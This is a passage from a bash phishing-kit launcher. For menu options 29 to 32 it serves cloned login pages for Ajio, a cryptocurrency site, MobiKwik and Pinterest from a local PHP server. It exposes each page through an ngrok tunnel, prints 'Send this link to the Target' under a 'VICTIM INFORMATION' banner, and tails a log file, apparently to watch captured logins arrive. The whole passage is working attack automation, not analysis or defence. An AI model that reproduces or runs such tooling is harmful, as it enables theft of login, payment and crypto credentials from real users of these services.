                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
     
                break;
                elif [ $option = 29 ] || [ $option = 29 ]
	        then
                         cd sites/
                         cd ajio/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
 

                break;
                elif [ $option = 30 ] || [ $option = 30 ]
	        then
                         cd sites/
                         cd cryptocurrency/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
 

                break;
                elif [ $option = 31 ] || [ $option = 31 ]
	        then
               
                         cd sites/
                         cd mobikwik/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt   

                break;
                elif [ $option = 32 ] || [ $option = 32 ]
	        then
                         cd sites/
                         cd pinterest/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt      

                break;
   
               

                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "\e[92m[\e[94m!\e[92m]\e[91m Invalid option Try Again !! \e[m "
		         sleep 2
                         exit
		         fi
                         done